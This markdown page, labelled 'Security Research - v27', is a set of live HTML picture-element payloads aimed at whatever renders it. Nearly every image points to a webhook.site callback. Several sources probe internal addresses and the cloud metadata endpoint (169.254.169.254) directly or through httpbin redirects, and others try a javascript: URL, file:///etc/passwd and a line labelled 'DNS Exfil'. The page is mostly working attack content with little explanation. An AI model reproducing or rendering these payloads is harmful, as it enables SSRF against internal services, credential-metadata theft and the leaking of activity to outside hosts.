# Security Research - v27

## Picture Element Deep Dive

Testing edge cases with `<picture>` element processing.

---

### 1) Multiple Sources - Which Gets Fetched?

<picture>
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source1.gif" media="(min-width: 1200px)">
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source2.gif" media="(min-width: 800px)">
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source3.gif" media="(min-width: 400px)">
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source4.gif">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback1.gif" alt="multi-source">
</picture>

---

### 2) Source Without Media Query

<picture>
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/no-media.gif">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback2.gif" alt="no-media">
</picture>

---

### 3) Picture with type attribute

<picture>
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/webp-source.gif" type="image/webp">
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/png-source.gif" type="image/png">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback3.gif" alt="type-attr">
</picture>

---

### 4) Srcset with Multiple URLs (density descriptors)

<picture>
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/1x.gif 1x, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/2x.gif 2x, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/3x.gif 3x">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback4.gif" alt="density">
</picture>

---

### 5) Srcset with Width descriptors

<picture>
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/100w.gif 100w, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/200w.gif 200w, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/400w.gif 400w" sizes="100vw">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback5.gif" alt="width">
</picture>

---

### 6) Picture with Internal IP in Source (SSRF test)

<picture>
  <source srcset="http://127.0.0.1/picture-ssrf.gif">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/ssrf-fallback.gif" alt="ssrf">
</picture>

---

### 7) Mixed External/Internal Sources

<picture>
  <source srcset="http://169.254.169.254/latest/" media="(min-width: 1200px)">
  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/external-source.gif" media="(min-width: 400px)">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/mixed-fallback.gif" alt="mixed">
</picture>

---

### 8) Redirect Chain in Picture Source

<picture>
  <source srcset="https://httpbin.org/redirect-to?url=http://127.0.0.1/redir-ssrf.gif">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/redir-fallback.gif" alt="redir">
</picture>

---

### 9) Picture Source to Metadata via Redirect

<picture>
  <source srcset="https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/meta-fallback.gif" alt="meta">
</picture>

---

### 10) Nested Picture Attempt

<picture>
  <picture>
    <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-inner.gif">
    <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-inner-fb.gif" alt="inner">
  </picture>
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-outer-fb.gif" alt="outer">
</picture>

---

### 11) Empty/Malformed Picture

<picture>
  <source srcset="">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/empty-source.gif" alt="empty">
</picture>

<picture>
  <source>
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/no-srcset.gif" alt="no-srcset">
</picture>

---

### 12) JavaScript URL in Srcset

<picture>
  <source srcset="javascript:alert(1)">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/js-fallback.gif" alt="js">
</picture>

---

### 13) Data URL in Srcset

<picture>
  <source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/data-fallback.gif" alt="data">
</picture>

---

### 14) File Protocol in Srcset

<picture>
  <source srcset="file:///etc/passwd">
  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/file-fallback.gif" alt="file">
</picture>

---

### DNS Exfil
![dns](https://v27-dns.29e8800b-a898-4775-94c8-c44a8c649ecf.dnshook.site/dns.gif)

### Canary
![v27-canary](https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/v27-canary.gif)

---

*v27 - Picture element deep dive*
